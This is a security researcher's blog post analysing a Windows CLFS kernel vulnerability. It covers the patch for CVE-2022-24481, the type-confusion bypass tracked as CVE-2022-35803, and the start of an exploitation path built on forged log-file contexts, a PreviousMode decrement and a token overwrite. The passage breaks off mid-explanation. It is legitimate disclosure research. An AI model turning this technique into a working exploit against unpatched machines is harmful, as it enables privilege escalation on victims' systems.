<!DOCTYPE html>
<html>
  <head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
  <meta name="description" content="NorthSea&#39;s Blog">
  <meta name="keyword" content="hexo-theme, vuejs">
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:site" content="@Pwnrin" />
  <meta name="twitter:title" content="Windows Kernel: Exploit CVE-2022-35803 in Common Log File System | NorthSea&#39;s Blog" />
  <meta name="twitter:image" content="https://blog.northseapwn.top/2022/11/11/Windows-Kernel-Exploit-CVE-2022-35803-in-Common-Log-File-System/tmp.jpeg" />
  
    <link rel="shortcut icon" href="/css/images/logo.png">
  
  <title>
    
      Windows Kernel: Exploit CVE-2022-35803 in Common Log File System | NorthSea&#39;s Blog
    
  </title>
  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
  
  
  
  
    <!-- MathJax support START -->
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    <!-- MathJax support END -->
  


  
  
<meta name="generator" content="Hexo 6.0.0"></head>
<div class="wechat-share">
  <img src="/css/images/logo.png" />
</div>
  <body>
    <header class="header fixed-header">
  <div class="header-container">
    <a class="home-link" href="/">
      <div class="logo"></div>
      <span>NorthSea's Blog</span>
    </a>
    <ul class="right-list">
      
        <li class="list-item">
          
            <a href="/" class="item-link">Home</a>
          
        </li>
      
        <li class="list-item">
          
            <a href="/archives/" class="item-link">Archives</a>
          
        </li>
      
        <li class="list-item">
          
            <a href="/about/" class="item-link">About</a>
          
        </li>
      
      
    </ul>
    <div class="menu">
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
    </div>
    <div class="menu-mask">
      <ul class="menu-list">
        
          <li class="menu-item">
            
              <a href="/" class="menu-link">Home</a>
            
          </li>
        
          <li class="menu-item">
            
              <a href="/archives/" class="menu-link">Archives</a>
            
          </li>
        
          <li class="menu-item">
            
              <a href="/about/" class="menu-link">About</a>
            
          </li>
        
      </ul>
    </div>
    
  </div>
</header>

    <div id="article-banner">
  <h2>Windows Kernel: Exploit CVE-2022-35803 in Common Log File System</h2>
  <p class="post-date">2022-11-11</p>
  <div class="arrow-down">
    <a href="javascript:;"></a>
  </div>
</div>
<main class="app-body flex-box">
  <!-- Article START -->
  <article class="post-article">
    <section class="markdown-content"><p><strong>Author: <a target="_blank" rel="noopener" href="https://twitter.com/uuulucky">@luckyu</a></strong></p>
<h1 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h1><p> In Windows, the Common Log File System (CLFS) is a general-purpose logging service that can be used by software clients running in user-mode or kernel-mode. The Common Log File System (CLFS) is implemented in Windows Kernel through clfs.sys. Due to parsing the file directly through the driver and the complexity of the log file structure itself, there are many security issues found in clfs.sys over the years, which become a common attack surface in Windows Kernel.</p>
<p>Earlier this year, I analyzed some past vulnerabilities in clfs.sys, and saw a sample of a in-the-wild vulnerability (CVE-2022-24481) fixed this year. Through the research on the sample and the patch for this vulnerability, I found that the patch of Microsoft for it was incomplete, then I bypassed the patch by a type confusion issue. Through some tricks of exploit, I completed the EoP on  Windows Kernel in May, and planned to use this vulnerability in the competition in the second half of this year. However, due to the cancel of the competition and other reasons, this vulnerability has been shelved until it was disclosed in September 2022 Patch Tuesday(Duplicated). </p>
<p>Now, I will analyze this vulnerability and show how to exploit this type confusion issue to achieve escalation of privilege on Windows Kernel.</p>
<h1 id="Old-Bug-Analysis-of-CVE-2022-24481"><a href="#Old-Bug-Analysis-of-CVE-2022-24481" class="headerlink" title="Old Bug: Analysis of CVE-2022-24481"></a>Old Bug: Analysis of CVE-2022-24481</h1><p>There is a key structure in CLFS named _CLFS_BASE_RECORD_HEADER used to represent the base record header:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">CLFS_BASE_RECORD_HEADER</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    CLFS_METADATA_RECORD_HEADER hdrBaseRecord;</span><br><span class="line">    CLFS_LOG_ID cidLog;</span><br><span class="line">    ULONGLONG rgClientSymTbl[CLIENT_SYMTBL_SIZE];</span><br><span class="line">    ULONGLONG rgContainerSymTbl[CONTAINER_SYMTBL_SIZE];</span><br><span class="line">    ULONGLONG rgSecuritySymTbl[SHARED_SECURITY_SYMTBL_SIZE];</span><br><span class="line">    ULONG cNextContainer;</span><br><span class="line">    CLFS_CLIENT_ID cNextClient;</span><br><span class="line">    ULONG cFreeContainers;</span><br><span class="line">    ULONG cActiveContainers;</span><br><span class="line">    ULONG cbFreeContainers;</span><br><span class="line">    ULONG cbBusyContainers;</span><br><span class="line">    ULONG rgClients[MAX_CLIENTS_DEFAULT];</span><br><span class="line">    ULONG rgContainers[MAX_CONTAINERS_DEFAULT];</span><br><span class="line">    ULONG cbSymbolZone;</span><br><span class="line">    ULONG cbSector;</span><br><span class="line">    USHORT bUnused;</span><br><span class="line">    CLFS_LOG_STATE eLogState;</span><br><span class="line">    UCHAR cUsn;</span><br><span class="line">    UCHAR cClients;</span><br><span class="line">&#125; CLFS_BASE_RECORD_HEADER, *PCLFS_BASE_RECORD_HEADER;</span><br></pre></td></tr></table></figure>

<p>The rgClients and rgContainers fields in the structure are used to represent a 32-bit array that stores the offsets of each client context and container context. A user can modify them on the disk. The root cause of the vulnerability is the lack of effective verification for the client offset, so that it can overlap with the container context. As a result, the modification of the client context caused by CLFS.sys will change the next container context at the same time.</p>
<p>The in-the-wild sample will trigger the function CClfsLogFcbPhysical::FlushMetadata when the log file is closed:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">CClfsLogFcbPhysical::FlushMetadata</span><span class="params">(__int64 CClfsLogFcbPhy)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ClfsClientContext = <span class="number">0</span>i64;</span><br><span class="line">  v2 = CClfsBaseFile::AcquireClientContext(*(ClfsLogFcbPhyObj + <span class="number">0x2A8</span>), <span class="number">0</span>, &amp;ClfsClientContext);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; (ClfsClientContext_1 = ClfsClientContext) != <span class="number">0</span>i64 )</span><br><span class="line">  &#123;</span><br><span class="line">    eState = ClfsClientContext-&gt;eState;</span><br><span class="line">    v5 = *(ClfsLogFcbPhyObj + <span class="number">0x15C</span>);</span><br><span class="line">    ClfsClientContext-&gt;llCreateTime = *(ClfsLogFcbPhyObj + <span class="number">0x1A0</span>);</span><br><span class="line">    ClfsClientContext_1-&gt;llAccessTime = *(ClfsLogFcbPhyObj + <span class="number">0x1A8</span>);</span><br><span class="line">    ClfsClientContext_1-&gt;llWriteTime = *(ClfsLogFcbPhyObj + <span class="number">0x1B0</span>);</span><br><span class="line">    ClfsClientContext_1-&gt;lsnOwnerPage.ullOffset = *(ClfsLogFcbPhyObj + <span class="number">0x538</span>);</span><br><span class="line">    ClfsClientContext_1-&gt;lsnArchiveTail.ullOffset = *(ClfsLogFcbPhyObj + <span class="number">0x1E0</span>);</span><br><span class="line">    ClfsClientContext_1-&gt;lsnBase.ullOffset = *(ClfsLogFcbPhyObj + <span class="number">0x1D8</span>);</span><br><span class="line">    ClfsClientContext_1-&gt;lsnLast.ullOffset = *(ClfsLogFcbPhyObj + <span class="number">0x1E8</span>);</span><br><span class="line">    ClfsClientContext_1-&gt;lsnRestart.ullOffset = *(ClfsLogFcbPhyObj + <span class="number">0x1F0</span>);</span><br><span class="line">    ClfsClientContext_1-&gt;cbFlushThreshold = *(ClfsLogFcbPhyObj + <span class="number">0x16C</span>);</span><br><span class="line">    HIWORD(ClfsClientContext_1-&gt;cidClient) = *(ClfsLogFcbPhyObj + <span class="number">0x168</span>);</span><br><span class="line">    v6 = eState | <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (v5 &amp; <span class="number">0x10</span>) == <span class="number">0</span> )</span><br><span class="line">      v6 = eState;</span><br><span class="line">    ClfsClientContext_1-&gt;eState = v6;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The CClfsLogFcbPhy variable pointer named in the above code is a CClfsLogFcbPhysical object, initialized in the CClfsLogFcbPhysical::Initialize function, which will be called when the log file is opened:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">CClfsLogFcbPhysical::Initialize</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  CClfsBaseFile::AcquireClientContext(*(ClfsLogFcbPhyObj + <span class="number">0x2A8</span>), <span class="number">0</span>, &amp;ClfsClientContext);</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> ( (ClfsClientContext-&gt;eState &amp; <span class="number">0x20</span>) == <span class="number">0</span> || (*(*ClfsLogFcbPhyObj + <span class="number">0x138</span>i64))(ClfsLogFcbPhyObj) )</span><br><span class="line">  &#123;</span><br><span class="line">    ClfsClientContext_1 = ClfsClientContext;</span><br><span class="line">    *(ClfsLogFcbPhyObj + <span class="number">0x1A0</span>) = ClfsClientContext-&gt;llCreateTime;</span><br><span class="line">    *(ClfsLogFcbPhyObj + <span class="number">0x1A8</span>) = ClfsClientContext_1-&gt;llAccessTime;</span><br><span class="line">    *(ClfsLogFcbPhyObj + <span class="number">0x1B0</span>) = ClfsClientContext_1-&gt;llWriteTime;</span><br><span class="line">    *(ClfsLogFcbPhyObj + <span class="number">0x1C8</span>) = <span class="number">0</span>i64;</span><br><span class="line">    *(ClfsLogFcbPhyObj + <span class="number">0x538</span>) = ClfsClientContext_1-&gt;lsnOwnerPage.ullOffset;</span><br><span class="line">    *(ClfsLogFcbPhyObj + <span class="number">0x1E0</span>) = ClfsClientContext_1-&gt;lsnArchiveTail.ullOffset;</span><br><span class="line">    *(ClfsLogFcbPhyObj + <span class="number">0x1D8</span>) = ClfsClientContext_1-&gt;lsnBase.ullOffset;</span><br><span class="line">    *(ClfsLogFcbPhyObj + <span class="number">0x1E8</span>) = ClfsClientContext_1-&gt;lsnLast.ullOffset;</span><br><span class="line">    *(ClfsLogFcbPhyObj + <span class="number">0x1F0</span>) = ClfsClientContext_1-&gt;lsnRestart.ullOffset;</span><br><span class="line">    *(ClfsLogFcbPhyObj + <span class="number">0x16C</span>) = ClfsClientContext_1-&gt;cbFlushThreshold;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>In the crafted CLFS log file, the attacker overlaps the llCreateTime field of client context with the pContainer field of container context, and sets the llCreateTime field to a address in userspace. After calling the function CClfsLogFcbPhysical::FlushMetadata, the pContainer field of container context(which stores a kernel pointer to the CClfsContainer object at runtime) will be modified.</p>
<p>After FlushMetadata ends, the clfs.sys will call the function CClfsLogFcbPhysical::CloseContainers to close containers:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">CClfsLogFcbPhysical::CloseContainers</span><span class="params">(__int64 ClfsLogFcbPhyObj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ClfsContainerContext = <span class="number">0</span>i64;</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v2 = *(ClfsLogFcbPhyObj + <span class="number">0x554</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= *(ClfsLogFcbPhyObj + <span class="number">0x550</span>) )</span><br><span class="line">    <span class="keyword">return</span> v1;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = CClfsBaseFile::AcquireContainerContext(</span><br><span class="line">           *(ClfsLogFcbPhyObj + <span class="number">0x2A8</span>),</span><br><span class="line">           *(ClfsLogFcbPhyObj + <span class="number">4</span>i64 * (v2 &amp; <span class="number">0x3FF</span>) + <span class="number">1368</span>),</span><br><span class="line">           &amp;ClfsContainerContext);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v4 = ClfsContainerContext;</span><br><span class="line">    <span class="keyword">if</span> ( !ClfsContainerContext )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    pContainer = ClfsContainerContext-&gt;pContainer;  &lt;&lt;-------- <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> ( pContainer )</span><br><span class="line">    &#123;</span><br><span class="line">      CClfsContainer::Close(pContainer);        &lt;&lt;-------- <span class="number">2</span></span><br><span class="line">      (*(*v4-&gt;pContainer + <span class="number">8</span>i64))(v4-&gt;pContainer);</span><br><span class="line">      v4-&gt;pContainer = <span class="number">0</span>i64;</span><br><span class="line">    &#125;</span><br><span class="line">    CClfsBaseFile::ReleaseContainerContext(*(ClfsLogFcbPhyObj + <span class="number">0x2A8</span>), &amp;ClfsContainerContext);</span><br><span class="line">    <span class="keyword">if</span> ( ++v2 &gt;= *(ClfsLogFcbPhyObj + <span class="number">0x550</span>) )</span><br><span class="line">      <span class="keyword">return</span> v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xC01A000D</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> After [1], the pContainer will point to an attacker-controlled memory space(in user space). When calling CClfsContainer::Close[2], the function ObfDereferenceObject will be triggered internally. This will lead to an arbitrary address decrement. This trick is used by the in-the-wild sample to reduce PreviousMode to zero, which will cause the calling thread to be set from user-mode to kernel-mode, and finally enable the user to read/write arbitrary address in kernel space through NtWriteVirtualMemory/NtReadVirtualMemory. After that, the user can achieve escalation of privilege by overwriting the token field in the _EPROCESS object of current process to the address(the sample gets these addresses through NtQuerySystemInformation) of the token in _EPROCESS object of System process.</p>
<h1 id="Patch-of-CVE-2022-24481"><a href="#Patch-of-CVE-2022-24481" class="headerlink" title="Patch of CVE-2022-24481"></a>Patch of CVE-2022-24481</h1><p>Through analysis of diff, it can be seen that the patch for vulnerability is to add a check for the offset of rgClients and rgContainers in CClfsBaseFile::ValidateRgOffsets:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">CClfsBaseFile::ValidateRgOffsets</span><span class="params">(CClfsBaseFile *<span class="keyword">this</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> *rgObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  extraNum = <span class="number">0</span>;</span><br><span class="line">  logBlockPtr = *(*(<span class="keyword">this</span> + <span class="number">6</span>) + <span class="number">0x30</span>i64);       <span class="comment">// * _CLFS_LOG_BLOCK_HEADER</span></span><br><span class="line">  <span class="keyword">if</span> ( !logBlockPtr )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xC01A000D</span>i64;</span><br><span class="line">  signOffset = logBlockPtr + *(logBlockPtr + <span class="number">0x68</span>);</span><br><span class="line">  <span class="keyword">if</span> ( signOffset &lt; logBlockPtr )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xC01A000D</span>i64;</span><br><span class="line">  qsort(rgOffsetArray, <span class="number">0x47C</span>ui64, <span class="number">4u</span>i64, CompareOffsets);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    currentOffset = *rgOffsetArray;</span><br><span class="line">    <span class="keyword">if</span> ( *rgOffsetArray - <span class="number">1</span> &lt;= <span class="number">0xFFFFFFFD</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      currentContext = CClfsBaseFile::OffsetToAddr(<span class="keyword">this</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !currentContext )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( currentOffset &lt; <span class="number">0x30</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v12 = currentOffset - <span class="number">0x30</span>;</span><br><span class="line">      v13 = extraNum * <span class="number">4</span> + v3 + <span class="number">0x30</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v13 &lt; v3 || v3 &amp;&amp; v13 &gt; v12 )   &lt;&lt;-------- <span class="number">3</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v3 = v12;</span><br><span class="line">      <span class="keyword">if</span> ( *currentContext == <span class="number">0xC1FDF008</span> )      <span class="comment">// CLFS_NODE_TYPE_CLIENT_CONTEXT</span></span><br><span class="line">      &#123;</span><br><span class="line">        extraNum = <span class="number">12</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *currentContext != <span class="number">0xC1FDF007</span> )    <span class="comment">// CLFS_NODE_TYPE_CONTAINER_CONTEXT</span></span><br><span class="line">          <span class="keyword">return</span> <span class="number">0xC01A000D</span>;</span><br><span class="line">        extraNum = <span class="number">34</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v1 = &amp;currentContext[extraNum];</span><br><span class="line">      <span class="keyword">if</span> ( v1 &lt; currentContext || v1 &gt; signOffset )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v6;</span><br><span class="line">    ++rgOffsetArray;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt;= <span class="number">0x47C</span> )</span><br><span class="line">      <span class="keyword">return</span> v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xC01A000D</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>An important check is introduced at [3] by the patch. It requires that the interval between container context and the next context should be at least 0x30+12*4 = 0x60 bytes, and the interval between client context and the next context should be at least 0x30+34*4 = 0x88 = 0xb8 bytes. However, In the function CClfsLogFcbPhysical::FlushMetadata, we can only modify the field at offset 0x78 bytes(ClfsClientContext-&gt;eState) at most. Therefore, the vulnerability was fixed by the added check.</p>
<h1 id="How-to-Bypass"><a href="#How-to-Bypass" class="headerlink" title="How to Bypass"></a>How to Bypass</h1><p>Through the analysis of the Patch, we can see that the fault of directly modifying the offset of client context has been fixed. But is there another way to overlap fields and lead to vulnerability?</p>
<p>Through research, I found that during the period from ValidateRgOffsets verifying offset to FlushMetadata modifying data, and from that to CloseContainers closing the container, there is no check for the validity of the field cidNode.cType(represents the type of context) of client context. This may lead to a type confusion issue: if we set the cidNode.cType of client context to 0xC1FDF008, the interval of the client context and the next context will be limited incorrectly to 0x60 bytes when ValidateRgOffsets calculates it, which will cause the fields of the client context at the offset of 0x60~0x88 bytes to overlap with the fields of the next context at the offset of 0~0x28 bytes. ==&gt; A new vulnerability has occurred.</p>
<p>I reviewed CClfsLogFcbPhysical::FlushMetadata again and determined that the pContainer in the next container context can be modified by ClfsClientContext-&gt;eState.</p>
<p>Since the original pContainer is aligned with 0x10 bytes, this will make the pContainer field point to the location of 8 bytes offset of  original Container object, which exactly stores the size of the Container file, which is specified through the parameter pcbContainer when user calls function AddLogContainer:</p>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/clfsw32/nf-clfsw32-addlogcontainer">https://learn.microsoft.com/en-us/windows/win32/api/clfsw32/nf-clfsw32-addlogcontainer</a> :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[in, optional] pcbContainer</span><br><span class="line"></span><br><span class="line">The optional parameter that specifies the size of the container, in bytes.</span><br><span class="line"></span><br><span class="line">The minimum size is 512 KB for normal logs and 1024 KB for multiplexed logs. The maximum size is approximately 4 gigabytes.</span><br></pre></td></tr></table></figure>

<p>Therefore, when the data is considered as an address, it can be located in the user space. This vulnerability can be exploited by faking a virtual function table of the container object in the user space!</p>
<p>Before:</p>
<div align=right><img src="Before.png" style="zoom:75%"></div>

<p>After:</p>
<div align=right><img src="After.png" style="zoom:75%"></div>

<h1 id="Let’s-Exploit-It"><a href="#Let’s-Exploit-It" class="headerlink" title="Let’s Exploit It"></a>Let’s Exploit It</h1><p>Next, I will show how to exploit this type confusion issue and achieve Escalation of Privilege.</p>
<p>In the analysis of the patch above, we know that when the type confusion issue occurs in the client context, we can modify the eState field with FlushMetadata to change pContainer field of the next container context, but this method needs to meet the following conditions:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">CClfsLogFcbPhysical::FlushMetadata</span><span class="params">(__int64 CClfsLogFcbPhy)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ClfsClientContext = <span class="number">0</span>i64;</span><br><span class="line">  v2 = CClfsBaseFile::AcquireClientContext(*(ClfsLogFcbPhyObj + <span class="number">0x2A8</span>), <span class="number">0</span>, &amp;ClfsClientContext);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; (ClfsClientContext_1 = ClfsClientContext) != <span class="number">0</span>i64 )</span><br><span class="line">  &#123;</span><br><span class="line">    eState = ClfsClientContext-&gt;eState;</span><br><span class="line">    v5 = *(ClfsLogFcbPhyObj + <span class="number">0x15C</span>);</span><br><span class="line">    ...</span><br><span class="line">    v6 = eState | <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (v5 &amp; <span class="number">0x10</span>) == <span class="number">0</span> ) &lt;&lt;-------- <span class="number">4</span></span><br><span class="line">      v6 = eState;</span><br><span class="line">    ClfsClientContext_1-&gt;eState = v6;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The check at [4] needs to be false.  ⇒ <code>(*(ClfsLogFcbPhyObj + 0x15C) &amp; 0x10) ≠ 0</code></p>
<p>About <code>*(ClfsLogFcbPhyObj + 0x15C)</code> :</p>
<p>A flag field is stored in <code>*(ClfsLogFcbPhyObj + 0x15C)</code>, which determines whether ClfsClientContext-&gt;eState will be modified. This condition cannot be passed under normal operations(CreateLogFile &amp;&amp; CloseHandle). In order to modify this field, we need to understand the meaning of field eState first. By Docs:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> UCHAR CLFS_LOG_STATE, *PCLFS_LOG_STATE;</span><br><span class="line"><span class="keyword">const</span> CLFS_LOG_STATE CLFS_LOG_UNINITIALIZED    = <span class="number">0x01</span>;</span><br><span class="line"><span class="keyword">const</span> CLFS_LOG_STATE CLFS_LOG_INITIALIZED      = <span class="number">0x02</span>;</span><br><span class="line"><span class="keyword">const</span> CLFS_LOG_STATE CLFS_LOG_ACTIVE           = <span class="number">0x04</span>;</span><br><span class="line"><span class="keyword">const</span> CLFS_LOG_STATE CLFS_LOG_PENDING_DELETE   = <span class="number">0x08</span>; &lt;&lt;-------- <span class="number">5</span></span><br><span class="line"><span class="keyword">const</span> CLFS_LOG_STATE CLFS_LOG_PENDING_ARCHIVE  = <span class="number">0x10</span>;</span><br><span class="line"><span class="keyword">const</span> CLFS_LOG_STATE CLFS_LOG_SHUTDOWN         = <span class="number">0x20</span>;</span><br><span class="line"><span class="keyword">const</span> CLFS_LOG_STATE CLFS_LOG_MULTIPLEXED      = <span class="number">0x40</span>;</span><br><span class="line"><span class="keyword">const</span> CLFS_LOG_STATE CLFS_LOG_SECURE           = <span class="number">0x80</span>; </span><br></pre></td></tr></table></figure>

<p>From the definition, it seems like that the log file is ready to be deleted when the value is 0x08[5]. So I focused on reversing and debugging the closing operations of client, tried to find the operation of the CLFS_LOG_PENDING_DELETE flag. I soon noticed some key operations in CClfsLogFcbCommon::DeleteLog:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">CClfsLogFcbCommon::DeleteLog</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 <span class="keyword">this</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">        struct _FILE_OBJECT *a2,</span></span></span><br><span class="line"><span class="params"><span class="function">        struct _FILE_DISPOSITION_INFORMATION *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">  v9 = *(_DWORD *)(<span class="keyword">this</span> + <span class="number">0x15C</span>);</span><br><span class="line">  ...</span><br><span class="line">      <span class="keyword">if</span> ( !CClfsLogFcbCommon::IsReadOnly((CClfsLogFcbCommon *)<span class="keyword">this</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_DWORD *)(<span class="keyword">this</span> + <span class="number">0x15C</span>) = v9 | <span class="number">0x10</span>; &lt;&lt;-------- <span class="number">6</span></span><br><span class="line">        a2-&gt;DeletePending = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Through the DeleteLogFile API, I successfully triggered the function and completed the modification of <code>*(ClfsLogFcbPhyObj + 0x15C)</code> [6].</p>
<p>Now, let’s make a fake client context:</p>
<p>Firstly, I modify the offset of client context to ensure that the eState field of client context overlaps with the pContainer of container context, and set the cidNode.cType of client context to 0xC1FDF008. The cidClient corresponds to the index of rgClients. In addition, I modify the related fields of CLFSHASHSYM in front of the client context, because there is a verification for the fields of CLFSHASHSYM in CClfsBaseFile::GetSymbol:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">CClfsBaseFile::GetSymbol</span><span class="params">(CClfsBaseFile *<span class="keyword">this</span>,<span class="keyword">unsigned</span> <span class="keyword">int</span> ClientContextOffset,<span class="keyword">char</span> ClientContextId,struct _CLFS_CLIENT_CONTEXT **a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> ( CClfsBaseFile::IsValidOffset(<span class="keyword">this</span>, ClientContextOffset + <span class="number">0x87</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ClientContextAddr = (__int64)CClfsBaseFile::OffsetToAddr(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)(ClientContextAddr - <span class="number">0xC</span>) != ClientContextOffset ) &lt;&lt;-------- <span class="number">7</span></span><br><span class="line">      &#123;</span><br><span class="line">        v8 = <span class="number">0xC0000008</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">      &#125;</span><br><span class="line">      v12 = ClfsQuadAlign(<span class="number">0x88</span>u);</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)(ClientContextAddr - <span class="number">0x10</span>) == (<span class="keyword">unsigned</span> __int64)(ClientContextOffset_1 + v12) &lt;&lt;-------- <span class="number">8</span></span><br><span class="line">        &amp;&amp; *(_BYTE *)(ClientContextAddr + <span class="number">8</span>) == ClientContextId )</span><br><span class="line">      &#123;</span><br><span class="line">        *a4 = (struct _CLFS_CLIENT_CONTEXT *)ClientContextAddr;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>CLFSHASHSYM is located above the context and offset by 0x30 bytes, and its offset is also stored in _CLFS_BASE_RECORD_HEADER (the fields rgClientSymTbl and rgContainerSymTbl), which are defined as:</p>
